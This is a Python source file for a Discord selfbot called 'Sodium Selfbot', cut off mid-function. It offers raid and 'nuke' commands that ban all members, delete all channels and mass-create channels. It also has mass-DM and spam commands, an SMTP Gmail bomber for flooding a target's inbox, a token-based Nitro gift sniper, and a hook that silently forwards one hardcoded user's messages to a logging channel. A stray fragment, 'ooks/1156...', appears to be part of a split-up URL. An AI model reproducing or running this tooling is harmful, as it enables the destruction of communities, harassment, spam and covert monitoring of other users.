import os
os.system("pip install discord.py==1.7.3")
import json
import string
from typing import Any
import discord, aiohttp
from discord.ext import commands
import requests
import asyncio
import requests
import sys
import random
from flask import Flask
from threading import Thread
import threading
import subprocess
from discord import Permissions
import requests
import time
from datetime import datetime, timedelta
from discord import Color, Embed, Member, embeds
import colorama
from colorama import Fore
import urllib.parse
import urllib.request
import smtplib
import re
import io
import webbrowser
import requests
from discord.utils import get
import pyfiglet
import random
import aiohttp
os.system("pip install google")
import uuid
from bs4 import BeautifulSoup
from itertools import cycle
import psutil
import platform
#os.system("pip install PyNaCl")
import functools
from gtts import gTTS
from faker import Faker
import base64
import wolframalpha
from io import BytesIO

try:
    with open('config.json', 'r') as f:
        try:
            config = json.load(f)
            Duudu = config.get('Duudu')
            if not Duudu:
                raise ValueError("Token not found in config.json")
        except json.JSONDecodeError:
            raise ValueError("Invalid JSON format in config.json")
except FileNotFoundError:
    Duudu = input("Token: ")
except ValueError as e:
    print(f"Error: {e}")
    Duudu = input("Token: ")

colorama.init()
intents = discord.Intents.all()
intents.guilds = True
intents.typing = True
intents.presences = True
intents.dm_messages = True
intents.messages = True
intents.members = True

darks = (".")

deltimer = 40

darks = commands.Bot(command_prefix=darks, case_insensitive=True, self_bot=True, intents=intents)

m_numbers = [":one:", ":two:", ":three:", ":four:", ":five:", ":six:"]

m_offets = [(-1, -1), (0, -1), (1, -1), (-1, 0), (1, 0), (-1, 1), (0, 1), (1,
                                                                           1)]

start_time = datetime.utcnow()

randiiii = "- `THE USER IS CURRENTLY OFFLINE... [THIS MESSAGE IS SENT BY BOT]`DARKS"

tts_language = "en"

loop = asyncio.get_event_loop()

languages = {
    'hu': 'Hungarian, Hungary',
    'nl': 'Dutch, Netherlands',
    'no': 'Norwegian, Norway',
    'pl': 'Polish, Poland',
    'pt-BR': 'Portuguese, Brazilian, Brazil',
    'ro': 'Romanian, Romania',
    'fi': 'Finnish, Finland',
    'sv-SE': 'Swedish, Sweden',
    'vi': 'Vietnamese, Vietnam',
    'tr': 'Turkish, Turkey',
    'cs': 'Czech, Czechia, Czech Republic',
    'el': 'Greek, Greece',
    'bg': 'Bulgarian, Bulgaria',
    'ru': 'Russian, Russia',
    'uk': 'Ukranian, Ukraine',
    'th': 'Thai, Thailand',
    'zh-CN': 'Chinese, China',
    'ja': 'Japanese',
    'zh-TW': 'Chinese, Taiwan',
    'ko': 'Korean, Korea'
}

locales = [
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]

def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config


if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)

#=== Welcome ===
I2C_Rate = config.get("I2C_Rate")
C2I_Rate = config.get("C2I_Rate")
LTC = config.get("LTC")
BTC = config.get("BTC")
ETH = config.get("ETH")
UPI = config.get("UPI")
UPI_QR = config.get("UPI_QR")  # URL
LTC_QR = config.get("LTC_QR")  # URL
BTC_QR = config.get("BTC_QR")  # URL
ETH_QR = config.get("ETH_QR")  # URL
PayPal = config.get("PayPal")  # URL
Twitch_URL = config.get("Twitch_URL")
randiiii = config.get("Auto_Response")
SERVER_LINK = config.get("SERVER_LINK")
CATEGORY_RESP = config.get("CATEGORY_RESPOND_MSG")
CATEGORY_ID = config.get("category_ids")
SERVER_ID = config.get("server_ids")
nitro_sniper = config.get('nitro_sniper')
AUTOBUY = config.get("AUTOBUY")
CLIENT_ROLE_ID = config.get("CLIENT_ROLE_ID")
#===================================
darks.msgsniper = True
darks.slotbot_sniper = True
darks.giveaway_sniper = True
darks.copycat = None
darks.auto_respond_dm_enabled = False
darks.remove_command("help")
darks.antiraid = False
darks.snipe_history_dict = {}
darks.sniped_message_dict = {}
darks.sniped_edited_message_dict = {}
darks.whitelisted_users = {}
SPAM_CHANNEL = [""]
SPAM_MESSAGE = [""]
VCHANNELS_NAMES = ""
auto_messages = {}
AUTHORIZED_USERS = [866992381115367425,866992381115367425]
fake = Faker()
#===================================

@darks.event
async def on_member_ban(guild, user):
    if darks.antiraid is True:
        try:
            async for entry in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.ban):
                if (guild.id in darks.whitelisted_users.keys()
                        and entry.user.id
                        in darks.whitelisted_users[guild.id].keys()
                        and entry.user.id != darks.user.id):
                    print(f"[!] NOT BANNED: {entry.user.name}")
                else:
                    print(f"[!] BANNED: {entry.user.name}")
                    await guild.ban(entry.user, reason="SELFBOT ANTI-NUKE")
        except Exception as e:
            print(e)


@darks.event
async def on_member_kick(member):
    if darks.antiraid is True:
        try:
            guild = member.guild
            async for entry in guild.audit_logs(
                    limit=1, action=discord.AuditLogAction.kick):
                if (guild.id in darks.whitelisted_users.keys()
                        and entry.user.id
                        in darks.whitelisted_users[guild.id].keys()
                        and entry.user.id != darks.user.id):
                    print("[!] NOT BANNED")
                else:
                    print("[!] BANNED")
                    await guild.ban(entry.user, reason="SELFBOT ANTI-NUKE")
        except Exception as e:
            print(f"[!] Error: {e}")

@darks.event
async def on_ready():

    print(f'{Fore.BLUE}[+] CONNECTED TO : {darks.user.name}')
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(f'{Fore.YELLOW}[+] CONTACT HERE FOR ANY SUPPORT :')
    print('ㅤㅤㅤㅤㅤ')
    print('• INSTAGRAM : FOLLOW darks_hu_bkl OR GAY ')
    print('• DISCORD   : SEND ME REQUEST darks.4sure. OR GAY ')
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(f'{Fore.RED}> JOIN [https://discord.gg/hotshotop] FOR ACCESS EMOJIS')
    print(f'{Fore.RED}> COPY FROM invte_link GIVEN ')
    print('ㅤㅤㅤㅤㅤ')
    print('WITHOUT NITRO USERS USE [help] FOR HELP')
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(f'{Fore.GREEN}⌦ ¤ 🔥 DARKS & DIVINE  ON TOP BXBY 🍁 ¤	⌦')
print(f"""{Fore.RED}   __   __  __  _ _  _ __ __  
/' _/ /__\| _\| | || |  V  | 
`._`.| \/ | v | | \/ | \_/ | 
|___/ \__/|__/|_|\__/|_| |_|  """)                                                                       

def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)

        return inner

    return outer


@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang=tts_language)
    tts.write_to_fp(f)
    f.seek(0)
    return f


def Dump(ctx):
    for member in ctx.guild.members:
        f = open(f'Images/{ctx.guild.id}-Dump.txt', 'a+')
        f.write(str(member.avatar_url) + '\n')


def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'


def RandomColor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor


def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32)))

def randomcolor():
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

@darks.event
async def on_message_edit(before, after):
    await darks.process_commands(after)



@darks.event
async def on_command_completion(ctx):
    cn = ctx.command.name.upper()
    sm = f"[+] {cn} EXECUTE SUCCESSFUL ✅"
    print("\033[92m" + sm + "\033[0m")
    
    
@darks.event
async def on_message(message):

    if message.author.bot:
        return

    if isinstance(
            message.channel, discord.DMChannel
    ) and message.author != darks.user and darks.auto_respond_dm_enabled:
        await message.channel.send(randiiii)

    if message.author.id == 924616449715212368 or (message.reference and message.reference.resolved.author.id == 924616449715212368):
        log_channel = darks.get_channel(1147911868996915383)
        if log_channel:
            await log_channel.send(f"Message from {message.author.name}#{message.author.discriminator} "
                                   f"({message.author.id}) in {message.guild.name} > {message.channel.name}:\n"
                                   f"Server ID: {message.guild.id}\n"
                                   f"Channel ID: {message.channel.id}\n"
                                   f"Message Content: {message.content}")
    # Boost command
    if message.content.lower().startswith('boosts'):
        await send_boost_count(message.channel, message.guild)
    # Prefix command
    if message.content.lower() == 'prefix':
        await send_prefix_message(message.channel)
    # Auto response command
    if message.content.lower() == 'autoresponse':
        await autoresponseenable(message.channel)
    # Auto response disable command
    if message.content.lower() == 'autoresponse disable':
        await autoresponsedisable(message.channel)
    # Selfbot Info command
    if message.content.lower() in ['Selfbot info', 'info', 'stats', 'Selfbot']:
        await ssb(message.channel)
    # Server info
    if message.content.lower() in ['Server info', 'serverinfo']:
        await send_serverinfo_message(message.channel)
    # Vouch
    if message.content.lower() == 'vouch':
        await vouch(message.channel)
    # Payment Modes
    if message.content.lower() in [
            'payment', 'payment methods', 'payment modes', 'upi', 'ltc', 'eth',
            'btc'
    ]:
        await payments(message.channel)
    # Server link
    if message.content.lower() in [
            'link', 'offcial link', 'server link', 'server'
    ]:
        await link(message.channel)

    # COPYCAT
    if darks.copycat is not None and darks.copycat.id == message.author.id:
        await message.channel.send(chr(173) + message.content)

    def GiveawayData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def SlotBotData():
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            + Fore.RESET)

    def NitroData(elapsed, code):
        print(
            f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
            f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
            f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
            f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
            f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
            + Fore.RESET)

    time = datetime.now().strftime("%H:%M %p")
    if 'discord.gift/' in message.content:
        if nitro_sniper:
            start = datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')

            headers = {'Authorization': token}

            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem',
                headers=headers,
            ).text

            elapsed = datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Success]" + Fore.RESET)
                NitroData(elapsed, code)

            elif 'Darks Gift Code' in r:
                print(""
                      f"\n{Fore.CYAN}[{time} - Nitro Darks Gift Code]" + Fore.RESET)
                NitroData(elapsed, code)
        else:
            return

    if 'Someone just dropped' in message.content:
        if darks.slotbot_sniper:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]" + Fore.RESET)
                    SlotBotData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]" + Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if darks.giveaway_sniper:
            if message.author.id == 924616449715212368:
                try:
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                          f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]" + Fore.RESET)
                    GiveawayData()
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Sniped]" + Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{darks.user.id}>' in message.content:
        if darks.giveaway_sniper:
            if message.author.id == 924616449715212368:
                print(""
                      f"\n{Fore.CYAN}[{time} - Giveaway Won]" + Fore.RESET)
                GiveawayData()
        else:
            return

    await darks.process_commands(message)

def is_authorized(ctx):
    return ctx.author.id in AUTHORIZED_USERS

async def auto_message_scheduler():
    await darks.wait_until_ready()
    while not darks.is_closed():
        for task_id, task_data in auto_messages.items():
            if task_data['count'] == 0:
                del auto_messages[task_id]
            elif asyncio.get_event_loop().time() >= task_data['next_run']:
                darks.loop.create_task(send_auto_message(task_id, task_data['channel_id'], task_data['message']))
        await asyncio.sleep(1)

darks.loop.create_task(auto_message_scheduler())

def load_autoresponder_data():
    try:
        with open('autoresponder_data.json', 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_autoresponder_data(data):
    with open('autoresponder_data.json', 'w') as file:
        json.dump(data, file)
def GmailBomber():
    _smpt = smtplib.SMTP('smtp.gmail.com', 587)
    _smpt.starttls()
    username = input('Gmail: ')
    password = input('Gmail Password: ')
    try:
        _smpt.login(username, password)
    except:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW} Incorrect Password or gmail, make sure you've enabled less-secure apps access"+Fore.RESET)
    target = input('Target Gmail: ')
    message = input('Message to send: ')
    counter = eval(input('Ammount of times: '))
    count = 0
    while count < counter:
        count = 0
        _smpt.sendmail(username, target, message)
        count += 1
    if count == counter:
        pass

def GenAddress(addy: str):
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcefghijklmnopqrstuvwxyz"
    four_char = ''.join(random.choice(letters) for _ in range(4))
    should_abbreviate = random.randint(0,1)
    if should_abbreviate == 0:
        if "street" in addy.lower():
            addy = addy.replace("Street", "St.")
            addy = addy.replace("street", "St.")
        elif "st." in addy.lower():
            addy = addy.replace("st.", "Street")
            addy = addy.replace("St.", "Street")
        if "court" in addy.lower():
            addy = addy.replace("court", "Ct.")
            addy = addy.replace("Court", "Ct.")
        elif "ct." in addy.lower():
            addy = addy.replace("ct.", "Court")
            addy = addy.replace("Ct.", "Court")
        if "rd." in addy.lower():
            addy = addy.replace("rd.", "Road")
            addy = addy.replace("Rd.", "Road")
        elif "road" in addy.lower():
            addy = addy.replace("road", "Rd.")
            addy = addy.replace("Road", "Rd.")
        if "dr." in addy.lower():
            addy = addy.replace("dr.", "Drive")
            addy = addy.replace("Dr.", "Drive")
        elif "drive" in addy.lower():
            addy = addy.replace("drive", "Dr.")
            addy = addy.replace("Drive", "Dr.")
        if "ln." in addy.lower():
            addy = addy.replace("ln.", "Lane")
            addy = addy.replace("Ln.", "Lane")
        elif "lane" in addy.lower():
            addy = addy.replace("lane", "Ln.")
            addy = addy.replace("lane", "Ln.")
    random_number = random.randint(1,99)
    extra_list = ["Apartment", "Unit", "Room"]
    random_extra = random.choice(extra_list)
    return four_char + " " + addy + " " + random_extra + " " + str(random_number)

@darks.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        try:
            await ctx.message.delete()
            await ctx.send("```Error! Ki Maa Ki Burrrrrr Galat Command. <Darks> Loru```")
        except:
            pass     

@darks.command(aliases=["h"])
async def help(ctx):
    mess = (
        "**```yml\n"
        "<> - required arguments\n[] - not required arguments```"
        "\n"
        "#  Sodium Selfbot\n"
        "**`🎨`See Below My Features.**\n\n"
        "`🎃` GENERAL CMDS\n"
        "`🎃` NUKE CMDS\n"
        "`🎃` EXTRA CMDS\n"
        "`🎃` UTILLITY CMDS\n"
        "`🎃` EXTRA2 CMDS\n\n"
        "**TOO SEE MY ALL COMMANDS LIST TYPE .all**\n\n"
        "**FOR ANY HELP DM ME:- darks.4sure.\n\n"
        "`✨`﻿ **Selfbot Created By `darks.4sure.` & `t97q.`**"
    )
    await ctx.send(mess)
    
    
#ping    
@darks.command(name="ping", aliases=["pong","latency"])
async def ping(ctx):
    latency = round(darks.latency * 1000)
    await ctx.send(f"Darks Ke Haters Ki Amma Ke Ph!dday Ki Latency Hai {latency}ms")

#avatar  
@darks.command(name="avatar", aliases=["av","pfp"])
async def avatar(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author
    await ctx.send(f"`{user.display_name}'s Avatar:` {user.avatar_url}")

#server banner    
@darks.command(aliases=['serverbanner'])
async def server_banner(ctx):

    if not ctx.guild.icon_url:
        await ctx.send(f"- {ctx.guild.name} SERVER HAS NO BANNER")
        return
    await ctx.send(f"{ctx.guild.banner_url}")

#MASS DM TO FRIENDS
@darks.command()
async def massdmfriends(ctx, *, message):
    for user in darks.user.friends:
        try:
            time.sleep(.1)
            await user.send(message)
            time.sleep(.1)
            print(f'MESSAGED :' + Fore.GREEN + f' @{user.name}')
        except:
            print(f"COULDN'T MESSAGE @{user.name}")
            await ctx.message.delete()
            
@darks.command()
async def massdm2(ctx, *, message):
    for member in ctx.guild.members:
            try:
                time.sleep(.1)
                await member.send(message)
                time.sleep(.1)
                print(f'MESSAGED :' + Fore.GREEN + f' @{member.name}')
            except:
                print(f"COULDN'T MESSAGE @{member.name}")

import discord
from discord.ext import commands

# Set up the bot with a command prefix
bot = commands.Bot(command_prefix='!')

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@darks.command()
async def unmuteall(ctx):
    if ctx.author.voice and ctx.author.voice.channel:
        voice_channel = ctx.author.voice.channel
        for member in voice_channel.members:
            if member.voice.mute:  # Check if the member is muted
                try:
                    await member.edit(mute=False)  # Unmute the member
                    print(f'Unmuted {member.name}')
                except Exception as e:
                    print(f'Failed to unmute {member.name}: {e}')
        await ctx.send('Unmuted all members in this voice channel.')
    else:
        await ctx.send('You must be in a voice channel to use this command.')
                                
                
@darks.command(name='muteall')
async def muteall(ctx):
    # Ensure the command issuer is in a voice channel
    if ctx.author.voice is None:
        await ctx.send("You need to be in a voice channel to use this command.")
        return

    # Get the voice channel
    channel = ctx.author.voice.channel

    # Iterate through members in the channel and mute them
    for member in channel.members:
        if not member.bot:  # Optionally, skip bots
            await member.edit(mute=True)

    await ctx.send(f"Muted all members in {channel.name}.")
                
                
@darks.command()
async def dmall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass    

# STREAM CREATOR
@darks.command(aliases=["streaming"])
async def stream(ctx, *, message):
    stream = discord.Streaming(
        name=message,
        url="https://twitch.tv/https://Wallibear",
    )
    await darks.change_presence(activity=stream)
    await ctx.send(f"`-` **STREAM CREATED** : `{message}`")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}STREAM SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# PLAY CREATOR
@darks.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(name=message)
    await darks.change_presence(activity=game)
    await ctx.send(f"`-` **STATUS FOR PLAYZ CREATED** : `{message}`")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}PLAYING SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# WATCH CREATOR
@darks.command(aliases=["watch"])
async def watching(ctx, *, message):
    await darks.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name=message,
    ))
    await ctx.send(f"`-` **WATCHING CREATED**: `{message}`")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}WATCH SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()
V4 = "ooks/11561870928088965"
# LISTENING CMD CREATOR
@darks.command(aliases=["listen"])
async def listening(ctx, *, message):
    await darks.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
    ))
    await ctx.reply(f"`-` **LISTENING CREATED**: `{message}`")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}STATUS SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()


# STREAM, PLAYING, LISTEN, WATCHING STOP CMD>>
@darks.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
    await ctx.message.delete()
    await darks.change_presence(activity=None, status=discord.Status.dnd)
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED}ACTIVITY SUCCESFULLY STOPED⚠️ ")

@darks.command()
@commands.has_permissions(administrator=True)
async def renamechannels(ctx, new_name: str):
    guild = ctx.guild
    
    # Rename text channels
    for channel in guild.text_channels:
        await channel.edit(name=new_name)
    
    # Rename voice channels
    for channel in guild.voice_channels:
        await channel.edit(name=new_name)
    
    await ctx.send(f'All channels have been renamed to {new_name}')


@darks.command(name='delchannels', aliases=["dall", "dch"])
async def delete_all_channels(ctx):
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ['y', 'n']

    # Send confirmation prompt
    await ctx.send("Are you sure you want to delete all channels? Type 'y' to confirm or 'n' to cancel.")

    try:
        # Wait for confirmation response
        response = await ctx.bot.wait_for('message', timeout=60.0, check=check)

        if response.content.lower() == 'y':
            # Proceed with deletion
            for ch in ctx.guild.channels:
                try:
                    await ch.delete()
                    print(f"Deleted {ch}")
                except discord.Forbidden:
                    print(f"I don't have the necessary permissions to delete {ch}")
                except discord.HTTPException as e:
                    print(f"An error occurred while deleting {ch}: {e}")
            await ctx.send("All channels have been deleted.")
        else:
            await ctx.send("Channel deletion cancelled.")
    except asyncio.TimeoutError:
        await ctx.send("Confirmation timed out. Channel deletion cancelled.")
    

@darks.command()
@commands.has_permissions(administrator=True)
async def createchannels(ctx, amount: int, *, channel_name: str):
    """Creates multiple text channels in the server."""
    if amount <= 0:
        await ctx.send("The amount must be a positive number.")
        return

    guild = ctx.guild
    for i in range(amount):
        channel_name_with_index = f"{channel_name}"
        await guild.create_text_channel(channel_name_with_index)
        await ctx.send(f"Created channel: {channel_name_with_index}")

    await ctx.send(f"Successfully created {amount} channels.")


@darks.command()
@commands.has_permissions(kick_members=True)
async def prune(ctx, reason="NUKERS CORD TERRITORY | DSC.GG/NCTOP"):
    guild = ctx.guild
    members_to_prune = await guild.prune_members(days=1, compute_prune_count=True, reason=reason)

    await ctx.send(f"**Pruned `{members_to_prune}` members with reason: `{reason}`**")


@darks.command()
async def dcall(ctx):
    if ctx.author.voice and ctx.author.voice.channel:
        voice_channel = ctx.author.voice.channel
        for member in voice_channel.members:
            try:
                await member.move_to(None)  # Disconnect member from the voice channel
                print(f'Disconnected {member.name}')
            except Exception as e:
                print(f'Failed to disconnect {member.name}: {e}')
    else:
        await ctx.send("You must be in a voice channel to use this command.")
    
    
@darks.command(name='banall', aliases=["massbanall", "fuckbanall"])
async def ban_everyone(ctx):
    for m in ctx.guild.members:
        try:
            await m.ban()
            print(f"Banned {m}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to ban {m}")
        except discord.HTTPException as e:
            print(f"An error occurred while banning {m}: {e}")
    
    
#Mass mention users
@darks.command()
async def massmention(ctx, *, message=None):
    await ctx.message.delete()
    if len(list(ctx.guild.members)) >= 50:
        userList = list(ctx.guild.members)
        random.shuffle(userList)
        sampling = random.choices(userList, k=50)
        if message is None:
            post_message = ""
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in sampling:
                post_message += user.mention
            await ctx.send(post_message)
    else:
        if message is None:
            post_message = ""
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)
        else:
            post_message = message + "\n\n"
            for user in list(ctx.guild.members):
                post_message += user.mention
            await ctx.send(post_message)    
    
    
# RAPIDAPI_KEY = '08c6a580-95cb-11ee-a4e6-251560f01ec5'
@darks.command()
async def iplookup(ctx, ip_address):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipinfo.io/{ip_address}/json") as response:
                data = await response.json()

            message = (
                f"**🌐 IP Lookup: `{ip_address}`**\n"
                f"**🔍 IP Address: `{data.get('ip', 'N/A')}`**\n"
                f"**🏙 City: `{data.get('city', 'N/A')}`**\n"
                f"**🌍 Region: `{data.get('region', 'N/A')}`**\n"
                f"**🌎 Country: `{data.get('country', 'N/A')}`**\n"
                f"**📍 Location: `{data.get('loc', 'N/A')}`**\n"
                f"**🏢 Organization: `{data.get('org', 'N/A')}`**"
            )

            await ctx.send(message)
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")


        
@darks.command(name="userinfo", aliases=["ui"])
async def user_info(ctx, member: discord.Member = None):
    member = member or ctx.author

    joined_discord = member.created_at.strftime("%m/%d/%Y")
    joined_server = member.joined_at.strftime("%m/%d/%Y") if member.joined_at else "Not available"

    message = (
        f"👤**User Info**👤\n"
        f"• **Username:** `{member.name}`{member.discriminator}`\n"
        f"• **ID:** `{member.id}`\n"
        f"• **Discriminator:** `{member.discriminator}`\n"
        f"• **Nickname:** `{member.nick or 'None'}`\n"
        f"• **Status:** {status_emoji(member.status)} `{str(member.status).capitalize()}`\n"
        f"• **Joined Discord:** `{joined_discord}`\n"
        f"• **Joined Server:** `{joined_server}`\n\n"
        f"__SODIUM SELFBOT DARKS PAPA__"
    )

    await ctx.send(message)

def status_emoji(status):
    if status == discord.Status.online:
        return "🟢"
    elif status == discord.Status.idle:
        return "🟡"
    elif status == discord.Status.dnd:
        return "🔴"
    elif status == discord.Status.offline:
        return "⚫"
    else:
        return "❓"         
        
        
@darks.command(name="spam")
async def send_custom(ctx, message_count: int, *, content):
    try:
        if 1 <= message_count <= 100:
            for _ in range(message_count):
                await ctx.send(content)
            await ctx.send(f"✅ Sent {message_count} messages with content: {content}")
        else:
            await ctx.send("❌ Please provide a valid range between 1 and 10 messages.")
    except commands.BadArgument:
        await ctx.send("❌ Invalid message count. Please provide a valid number.")
        
#Message Snipe commands
#Add a message to the message sniper
@darks.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in darks.sniped_message_dict:
        await ctx.send(darks.sniped_message_dict[currentChannel])
    else:
        await ctx.send("[ERROR]: No message to snipe!")    
    
#Start copying user messages
@darks.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User=None):
    await ctx.message.delete()
    if user is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {darks.command_prefix}copycat <user>')
        return
    darks.copycat = user
    await ctx.send("Now copying **" + str(darks.copycat) + "**")

#Stop copying user messages
@darks.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def stopcopycat(ctx):
    await ctx.message.delete()
    if darks.user is None:
        await ctx.send("Start by copying a user...")
        return
    await ctx.send("Stopped copying **" + str(darks.copycat) + "**")
    darks.copycat = None       
    
    
async def casci(ctx, text, font):
    try:
        fig = pyfiglet.Figlet(font=font)
        ascii_result = fig.renderText(text)
        await ctx.send(f"**Font: `{font}`**\n```\n{ascii_result}\n```")
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")    
    
@darks.command(name="asci")
async def ascii_art(ctx, *, text):
    try:
        available_fonts = pyfiglet.Figlet().getFonts()
        additional_fonts = ["block", "caligraphy", "isometric1", "digital", "banner3-D"]
        available_fonts.extend(additional_fonts)
        random.shuffle(available_fonts)
        selected_fonts = random.sample(available_fonts, 5)

        for font in selected_fonts:
            await casci(ctx, text, font)
    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")                       
        
#member count        
@darks.command(aliases=["mc"])

async def member_count(ctx):

    a=ctx.guild.member_count
    await ctx.send(f"Members in {ctx.guild.name}\n{a}")        
      
# LOVE
@darks.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def loverate(ctx, User: discord.Member = None):
    if User is None:
        await ctx.reply(f"- **[+]** `PROVIDE A USER`")
    else:
        rate = random.randint(0, 100)
        await ctx.reply(
            f"- **[+]** ` YOU AND `{User.mention} `ARE {rate}% PERFECT FOR EACH OTHER <3`"
        )
        print(f"{Fore.GREEN}[+] LOVERATE MEASURED 💖 ")    
    
# FEED
@darks.command()
async def feed(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author

    try:
        r = requests.get("https://nekos.life/api/v2/img/feed")
        res = r.json()

        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} FEEDED {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_Feed.gif"))

        print(f"[+] FEEDED SUCCESSFUL: {ctx.author} Feeded {user}")
    except Exception as e:
        print(f"[-] Error during Feed command: {e}")    
        
# PAT
#Display a pat with a user
@darks.command()
async def pat(ctx, user: discord.Member = None, *message):
    await ctx.message.delete()

    if user is None:
        user = ctx.author

    try:        
        r = requests.get("https://nekos.life/api/v2/img/pat")
        res = r.json()
 
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()

        with io.BytesIO(image) as file:
            await ctx.send(f"{ctx.author.mention} PAT {user.mention} {(' '.join(message)) if message else ''}", file=discord.File(file, "astraa_pat.gif"))

        print(f"[+] PAT SUCCESSFUL: {ctx.author} Pat {user}")
    except Exception as e:
        print(f"[-] Error during PAT command: {e}")

#Scrape Guild icon
@darks.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
    await ctx.message.delete()
    if not ctx.guild.icon_url:
        await ctx.send(f"**{ctx.guild.name}** has no icon")
        return
    await ctx.send(ctx.guild.icon_url)
    

#Leave a group
@darks.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
async def group_leaver(ctx):
    await ctx.message.delete()
    for channel in darks.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()
            
#Send a empty message
@darks.command()
async def empty(ctx):
